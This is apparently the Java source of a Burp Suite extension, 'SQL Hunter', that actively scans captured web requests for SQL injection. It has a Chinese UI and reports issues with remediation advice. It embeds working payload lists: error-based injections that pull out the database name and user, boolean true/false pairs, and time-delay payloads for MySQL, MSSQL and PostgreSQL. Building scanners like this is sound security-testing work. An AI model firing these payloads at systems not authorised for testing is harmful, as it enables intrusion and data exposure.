package com.sqlhunter;

import burp.*;

import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Pattern;

public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IMessageEditorController {

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private JPanel mainPanel;
    private JCheckBox liveCheckBox;
    private JTable logTable;
    private DefaultTableModel tableModel;

    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;

    private final Set<String> processedKeys = new HashSet<String>();
    private final List<LogEntry> logEntries = new CopyOnWriteArrayList<LogEntry>();
    private final AtomicInteger rowIdGenerator = new AtomicInteger(1);

    private ExecutorService scanExecutor;
    private ExecutorService parameterExecutor;

    private volatile IHttpRequestResponse currentlyDisplayedItem;

    private static final String[] COLUMNS = new String[]{"ID", "时间", "主机", "路径", "参数", "类型", "Payload", "证据", "状态"};

    private static final String[] ERROR_PAYLOAD_SUFFIXES = new String[]{
            "'",
            "\"",
            "' and extractvalue(1,concat(0x7e,database(),0x7e))-- ",
            "' and updatexml(1,concat(0x7e,user(),0x7e),1)-- ",
            "' and exp(~(select*from(select user())a))-- "
    };

    private static final String[][] BOOLEAN_PAYLOAD_PAIRS = new String[][]{
            {"' AND '1'='1", "' AND '1'='2"},
            {"' OR 1=1-- ", "' OR 1=2-- "},
            {"') AND ('abc'='abc", "') AND ('abc'='abd"}
    };

    private static final String[] TIME_PAYLOAD_SUFFIXES = new String[]{
            "'; WAITFOR DELAY '0:0:3'--",
            "' AND SLEEP(2.5)-- ",
            "' AND IF(1=1,SLEEP(2.5),0)-- ",
            "';SELECT pg_sleep(2.5)--"
    };

    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("SQL Hunter (Java8)");

        int cores = Math.max(4, Runtime.getRuntime().availableProcessors());
        this.scanExecutor = Executors.newFixedThreadPool(Math.max(2, cores / 2));
        this.parameterExecutor = Executors.newFixedThreadPool(cores * 2);

        buildUi();

        callbacks.registerHttpListener(this);
        callbacks.registerContextMenuFactory(this);
        callbacks.addSuiteTab(this);
        callbacks.printOutput("[SQL Hunter] Java extension loaded.");
    }

    private void buildUi() {
        mainPanel = new JPanel(new BorderLayout());

        JPanel top = new JPanel();
        top.setLayout(new BoxLayout(top, BoxLayout.X_AXIS));

        liveCheckBox = new JCheckBox("被动监听实时流量", false);
        JButton scanHistoryButton = new JButton("扫描 Proxy History");
        scanHistoryButton.addActionListener(this::onScanHistory);

        JButton clearHistoryButton = new JButton("清除检测历史");
        clearHistoryButton.addActionListener(this::onClearHistory);

        top.add(liveCheckBox);
        top.add(Box.createHorizontalStrut(8));
        top.add(scanHistoryButton);
        top.add(Box.createHorizontalStrut(8));
        top.add(clearHistoryButton);

        tableModel = new DefaultTableModel(COLUMNS, 0) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };

        logTable = new JTable(tableModel);
        logTable.getSelectionModel().addListSelectionListener(this::onRowSelected);
        logTable.setDefaultRenderer(Object.class, new DefaultTableCellRenderer() {
            @Override
            public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected,
                                                           boolean hasFocus, int row, int column) {
                Component c = super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
                Object statusObj = table.getValueAt(row, 8);
                String status = statusObj == null ? "" : String.valueOf(statusObj);
                if (!isSelected) {
                    if ("VULN".equals(status)) {
                        Object typeObj = table.getValueAt(row, 5);
                        String type = typeObj == null ? "" : String.valueOf(typeObj);
                        if ("时间盲注".equals(type)) {
                            c.setBackground(new Color(210, 59, 59)); // 红
                            c.setForeground(Color.WHITE);
                        } else if ("盲注".equals(type)) {
                            c.setBackground(new Color(245, 174, 66)); // 橙黄
                            c.setForeground(Color.BLACK);
                        } else if ("报错注入".equals(type)) {
                            c.setBackground(new Color(128, 84, 192)); // 紫
                            c.setForeground(Color.WHITE);
                        } else {
                            c.setBackground(new Color(245, 174, 66));
                            c.setForeground(Color.BLACK);
                        }
                    } else {
                        c.setBackground(Color.WHITE);
                        c.setForeground(Color.BLACK);
                    }
                }
                return c;
            }
        });

        JScrollPane tableScroll = new JScrollPane(logTable);

        requestViewer = callbacks.createMessageEditor(this, false);
        responseViewer = callbacks.createMessageEditor(this, false);

        JSplitPane messageSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
                requestViewer.getComponent(), responseViewer.getComponent());
        messageSplit.setResizeWeight(0.5);

        JSplitPane rootSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, messageSplit);
        rootSplit.setResizeWeight(0.55);

        mainPanel.add(top, BorderLayout.NORTH);
        mainPanel.add(rootSplit, BorderLayout.CENTER);
    }

    private void onRowSelected(ListSelectionEvent event) {
        if (event.getValueIsAdjusting()) {
            return;
        }
        int row = logTable.getSelectedRow();
        if (row < 0 || row >= logEntries.size()) {
            return;
        }

        LogEntry entry = logEntries.get(row);
        currentlyDisplayedItem = entry.message;
        if (currentlyDisplayedItem != null) {
            requestViewer.setMessage(currentlyDisplayedItem.getRequest(), true);
            responseViewer.setMessage(currentlyDisplayedItem.getResponse(), false);
        }
    }

    private void onClearHistory(ActionEvent event) {
        logEntries.clear();
        currentlyDisplayedItem = null;
        SwingUtilities.invokeLater(() -> {
            tableModel.setRowCount(0);
            requestViewer.setMessage(null, true);
            responseViewer.setMessage(null, false);
        });
    }

    @Override
    public String getTabCaption() {
        return "SQL Hunter";
    }

    @Override
    public Component getUiComponent() {
        return mainPanel;
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (messageIsRequest || !liveCheckBox.isSelected()) {
            return;
        }

        String key = requestKey(messageInfo);
        synchronized (processedKeys) {
            if (processedKeys.contains(key)) {
                return;
            }
            processedKeys.add(key);
        }

        enqueueAndScan(messageInfo);
    }

    @Override
    public List<JMenuItem> createMenuItems(final IContextMenuInvocation invocation) {
        JMenuItem sendItem = new JMenuItem("Send to SQL Hunter (Auto SQLi Check)");
        sendItem.addActionListener(e -> {
            IHttpRequestResponse[] selected = invocation.getSelectedMessages();
            if (selected == null || selected.length == 0) {
                return;
            }
            for (IHttpRequestResponse item : selected) {
                enqueueAndScan(item);
            }
            appendLog("-", "-", "-", "-", "-", "-", "已加入并开始检测", "INFO", null);
        });

        List<JMenuItem> items = new ArrayList<JMenuItem>();
        items.add(sendItem);
        return items;
    }

    private void onScanHistory(ActionEvent event) {
        IHttpRequestResponse[] history = callbacks.getProxyHistory();
        if (history == null || history.length == 0) {
            JOptionPane.showMessageDialog(mainPanel, "Proxy History 为空");
            return;
        }

        int count = 0;
        for (IHttpRequestResponse item : history) {
            String key = requestKey(item);
            boolean isNew;
            synchronized (processedKeys) {
                isNew = !processedKeys.contains(key);
                if (isNew) {
                    processedKeys.add(key);
                }
            }
            if (isNew) {
                enqueueAndScan(item);
                count++;
            }
        }

        JOptionPane.showMessageDialog(mainPanel, "已加入并开始检测: " + count);
    }

    private void enqueueAndScan(IHttpRequestResponse messageInfo) {
        IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);
        URL url = requestInfo.getUrl();

        List<IParameter> parameters = requestInfo.getParameters();
        String firstParam = parameters.isEmpty() ? "-" : parameters.get(0).getName();

        appendLog(now(), safe(url == null ? null : url.getHost()), safe(url == null ? null : url.getPath()),
                firstParam, "待检测", "-", "请求已收集", "PENDING", messageInfo);

        scanExecutor.submit(() -> runActiveChecks(messageInfo));
    }

    private void runActiveChecks(IHttpRequestResponse baseMessage) {
        IRequestInfo requestInfo = helpers.analyzeRequest(baseMessage);
        URL url = requestInfo.getUrl();
        String host = safe(url == null ? null : url.getHost());
        String path = safe(url == null ? null : url.getPath());
        String requestMethod = requestInfo.getMethod();

        List<IParameter> params = requestInfo.getParameters();
        if (params == null || params.isEmpty()) {
            appendLog(now(), host, path, "-", "-", "-", "无可注入参数", "SKIP", baseMessage);
            return;
        }

        byte[] baseResp = awaitBaselineResponse(baseMessage, 3000L);
        if (baseResp == null) {
            appendLog(now(), host, path, "-", "-", "-", "超过3秒无响应，判定基线响应为空", "SKIP", baseMessage);
            return;
        }

        IResponseInfo baseInfo = helpers.analyzeResponse(baseResp);
        short baseStatus = baseInfo.getStatusCode();
        String baseBody = helpers.bytesToString(slice(baseResp, baseInfo.getBodyOffset()));

        AtomicBoolean found = new AtomicBoolean(false);
        List<Future<?>> parameterFutures = new ArrayList<Future<?>>();

        for (IParameter parameter : params) {
            parameterFutures.add(parameterExecutor.submit(() ->
                    testParameter(baseMessage, parameter, baseResp, baseStatus, baseBody, host, path, requestMethod, found)));
        }

        for (Future<?> future : parameterFutures) {
            try {
                future.get();
            } catch (Exception e) {
                callbacks.printError("[SQL Hunter] parameter task error: " + e.getMessage());
            }
        }

        if (!found.get()) {
            appendLog(now(), host, path, "-", "-", "-", "未确认 SQL 注入", "CLEAN", baseMessage);
        }
    }

    private void testParameter(IHttpRequestResponse baseMessage,
                               IParameter parameter,
                               byte[] baseResp,
                               short baseStatus,
                               String baseBody,
                               String host,
                               String path,
                               String requestMethod,
                               AtomicBoolean found) {
        String name = parameter.getName();
        String value = parameter.getValue();

        for (String suffix : ERROR_PAYLOAD_SUFFIXES) {
            if ("POST".equalsIgnoreCase(requestMethod) && "\"".equals(suffix)) {
                continue;
            }
            String payload = value + suffix;
            IHttpRequestResponse resp = sendPayloadAndLog(baseMessage, parameter, payload, host, path, name, "报错注入-测试", "发送测试 payload", requestMethod);
            if (resp != null && isErrorBased(baseStatus, baseBody, resp.getResponse())) {
                found.set(true);
                markVuln(resp, "magenta", "Error-based SQLi confirmed");
                appendLog(now(), host, path, name, "报错注入", payload, "发现数据库报错特征", "VULN", resp);
                reportIssue(resp, "Error-based SQL Injection", name, "High", payload);
            }
        }

        for (String[] pair : BOOLEAN_PAYLOAD_PAIRS) {
            String truePayload = value + pair[0];
            String falsePayload = value + pair[1];
            IHttpRequestResponse trueResp = sendPayloadAndLog(baseMessage, parameter, truePayload, host, path, name,
                    "盲注-测试", "发送真条件 payload", requestMethod);
            IHttpRequestResponse falseResp = sendPayloadAndLog(baseMessage, parameter, falsePayload, host, path, name,
                    "盲注-测试", "发送假条件 payload", requestMethod);
            if (trueResp != null && falseResp != null && isBooleanBlind(baseResp, trueResp.getResponse(), falseResp.getResponse())) {
                found.set(true);
                markVuln(falseResp, "orange", "Boolean blind SQLi confirmed");
                appendLog(now(), host, path, name, "盲注", truePayload + " || " + falsePayload,
                        "真/假条件响应差异显著", "VULN", falseResp);
                reportIssue(falseResp, "Boolean-based Blind SQL Injection", name, "High", truePayload + " || " + falsePayload);
            }
        }

        for (String suffix : TIME_PAYLOAD_SUFFIXES) {
            String payload = value + suffix;
            long start = System.currentTimeMillis();
            IHttpRequestResponse resp = sendPayload(baseMessage, parameter, payload, requestMethod);
            long elapsed = System.currentTimeMillis() - start;
            appendLog(now(), host, path, name, "时间盲注-测试", payload,
                    "发送延时 payload, elapsed=" + elapsed + "ms", "TESTING", resp);
            if (resp != null && elapsed >= 2500L) {
                found.set(true);
                markVuln(resp, "red", "Time blind SQLi confirmed");
                appendLog(now(), host, path, name, "时间盲注", payload,
                        "响应延时 " + (elapsed / 1000.0) + "s", "VULN", resp);
                reportIssue(resp, "Time-based Blind SQL Injection", name, "High", payload);
            }
        }
    }

    private IHttpRequestResponse sendPayloadAndLog(IHttpRequestResponse base,
                                                   IParameter parameter,
                                                   String payloadValue,
                                                   String host,
                                                   String path,
                                                   String param,
                                                   String type,
                                                   String evidence,
                                                   String requestMethod) {
        IHttpRequestResponse resp = sendPayload(base, parameter, payloadValue, requestMethod);
        appendLog(now(), host, path, param, type, payloadValue, evidence, "TESTING", resp);
        return resp;
    }

    private IHttpRequestResponse sendPayload(IHttpRequestResponse base, IParameter parameter, String payloadValue, String requestMethod) {
        String finalPayload = payloadValue;
        if ("GET".equalsIgnoreCase(requestMethod)) {
            try {
                finalPayload = URLEncoder.encode(payloadValue, "UTF-8").replace("+", "%20");
            } catch (UnsupportedEncodingException e) {
                finalPayload = payloadValue;
            }
        }
        IParameter newParameter = helpers.buildParameter(parameter.getName(), finalPayload, parameter.getType());
        byte[] request = helpers.updateParameter(base.getRequest(), newParameter);
        return callbacks.makeHttpRequest(base.getHttpService(), request);
    }

    private byte[] awaitBaselineResponse(IHttpRequestResponse baseMessage, long waitMs) {
        long start = System.currentTimeMillis();
        byte[] response = baseMessage.getResponse();
        while (response == null && System.currentTimeMillis() - start < waitMs) {
            try {
                Thread.sleep(200L);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
            response = baseMessage.getResponse();
        }

        if (response != null) {
            return response;
        }

        // fallback: resend baseline request once, then apply the same >3s no-response rule
        long resendStart = System.currentTimeMillis();
        IHttpRequestResponse resent = callbacks.makeHttpRequest(baseMessage.getHttpService(), baseMessage.getRequest());
        byte[] resentResp = resent == null ? null : resent.getResponse();
        long elapsed = System.currentTimeMillis() - resendStart;

        if (resentResp == null && elapsed >= waitMs) {
            return null;
        }
        return resentResp;
    }

    private boolean isErrorBased(short baseStatus, String baseBody, byte[] response) {
        if (response == null) {
            return false;
        }
        IResponseInfo respInfo = helpers.analyzeResponse(response);
        short status = respInfo.getStatusCode();
        String body = helpers.bytesToString(slice(response, respInfo.getBodyOffset()));

        String[] patterns = new String[]{
                "SQL syntax",
                "warning.*mysql",
                "unclosed quotation",
                "quoted string not properly terminated",
                "PG::SyntaxError",
                "ODBC SQL Server Driver",
                "SQLite/JDBCDriver",
                "XPATH syntax error",
                "Duplicate entry",
                "You have an error in your SQL syntax"
        };

        for (String p : patterns) {
            if (Pattern.compile(p, Pattern.CASE_INSENSITIVE).matcher(body).find()) {
                return true;
            }
        }

        return status >= 500 && baseStatus < 500 && Math.abs(body.length() - baseBody.length()) > 50;
    }

    private boolean isBooleanBlind(byte[] baseResp, byte[] trueResp, byte[] falseResp) {
        if (baseResp == null || trueResp == null || falseResp == null) {
            return false;
        }

        IResponseInfo b = helpers.analyzeResponse(baseResp);
        IResponseInfo t = helpers.analyzeResponse(trueResp);
        IResponseInfo f = helpers.analyzeResponse(falseResp);

        short bStatus = b.getStatusCode();
        short tStatus = t.getStatusCode();
        short fStatus = f.getStatusCode();

        String bBody = helpers.bytesToString(slice(baseResp, b.getBodyOffset()));
        String tBody = helpers.bytesToString(slice(trueResp, t.getBodyOffset()));
        String fBody = helpers.bytesToString(slice(falseResp, f.getBodyOffset()));

        boolean statusDiff = (tStatus == bStatus && fStatus != bStatus) || (tStatus != fStatus);
        boolean lenDiff = Math.abs(tBody.length() - fBody.length()) > Math.max(30, (int) (bBody.length() * 0.05));
        return statusDiff || lenDiff;
    }

    private void markVuln(IHttpRequestResponse item, String color, String comment) {
        item.setHighlight(color);
        item.setComment(comment);
    }

    private void reportIssue(IHttpRequestResponse item, String issueName, String paramName, String severity, String payload) {
        URL url = helpers.analyzeRequest(item).getUrl();
        callbacks.addScanIssue(new CustomScanIssue(
                item.getHttpService(),
                url,
                new IHttpRequestResponse[]{item},
                issueName,
                "Parameter <b>" + paramName + "</b> appears injectable.<br/>Payload: <code>" + escapeHtml(payload) + "</code>",
                severity
        ));
    }

    private void appendLog(String time,
                           String host,
                           String path,
                           String param,
                           String type,
                           String payload,
                           String evidence,
                           String status,
                           IHttpRequestResponse message) {
        int rowId = rowIdGenerator.getAndIncrement();
        LogEntry entry = new LogEntry(rowId, time, host, path, param, type, payload, evidence, status, message);
        logEntries.add(entry);

        SwingUtilities.invokeLater(() -> tableModel.addRow(new Object[]{
                entry.id, entry.time, entry.host, entry.path, entry.param, entry.type, entry.payload, entry.evidence, entry.status
        }));
    }

    private String requestKey(IHttpRequestResponse item) {
        IRequestInfo info = helpers.analyzeRequest(item);
        URL url = info.getUrl();
        return info.getMethod() + " " + String.valueOf(url);
    }

    private String now() {
        return new SimpleDateFormat("HH:mm:ss").format(new Date());
    }

    private String safe(String value) {
        return value == null ? "-" : value;
    }

    private String escapeHtml(String raw) {
        if (raw == null) {
            return "";
        }
        return raw.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    private byte[] slice(byte[] raw, int offset) {
        if (raw == null || offset < 0 || offset >= raw.length) {
            return new byte[0];
        }
        int len = raw.length - offset;
        byte[] result = new byte[len];
        System.arraycopy(raw, offset, result, 0, len);
        return result;
    }

    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem == null ? null : currentlyDisplayedItem.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem == null ? null : currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem == null ? null : currentlyDisplayedItem.getResponse();
    }

    private static class LogEntry {
        private final int id;
        private final String time;
        private final String host;
        private final String path;
        private final String param;
        private final String type;
        private final String payload;
        private final String evidence;
        private final String status;
        private final IHttpRequestResponse message;

        private LogEntry(int id,
                         String time,
                         String host,
                         String path,
                         String param,
                         String type,
                         String payload,
                         String evidence,
                         String status,
                         IHttpRequestResponse message) {
            this.id = id;
            this.time = time;
            this.host = host;
            this.path = path;
            this.param = param;
            this.type = type;
            this.payload = payload;
            this.evidence = evidence;
            this.status = status;
            this.message = message;
        }
    }

    private static class CustomScanIssue implements IScanIssue {
        private final IHttpService httpService;
        private final URL url;
        private final IHttpRequestResponse[] httpMessages;
        private final String issueName;
        private final String issueDetail;
        private final String severity;

        public CustomScanIssue(IHttpService httpService, URL url, IHttpRequestResponse[] httpMessages,
                               String issueName, String issueDetail, String severity) {
            this.httpService = httpService;
            this.url = url;
            this.httpMessages = httpMessages;
            this.issueName = issueName;
            this.issueDetail = issueDetail;
            this.severity = severity;
        }

        @Override
        public URL getUrl() {
            return url;
        }

        @Override
        public String getIssueName() {
            return issueName;
        }

        @Override
        public int getIssueType() {
            return 0;
        }

        @Override
        public String getSeverity() {
            return severity;
        }

        @Override
        public String getConfidence() {
            return "Firm";
        }

        @Override
        public String getIssueBackground() {
            return "SQL injection allows attackers to interfere with backend queries.";
        }

        @Override
        public String getRemediationBackground() {
            return "Use parameterized queries and strict input validation.";
        }

        @Override
        public String getIssueDetail() {
            return issueDetail;
        }

        @Override
        public String getRemediationDetail() {
            return "Refactor dynamic SQL and centralize safe data-access wrappers.";
        }

        @Override
        public IHttpRequestResponse[] getHttpMessages() {
            return httpMessages;
        }

        @Override
        public IHttpService getHttpService() {
            return httpService;
        }
    }
}
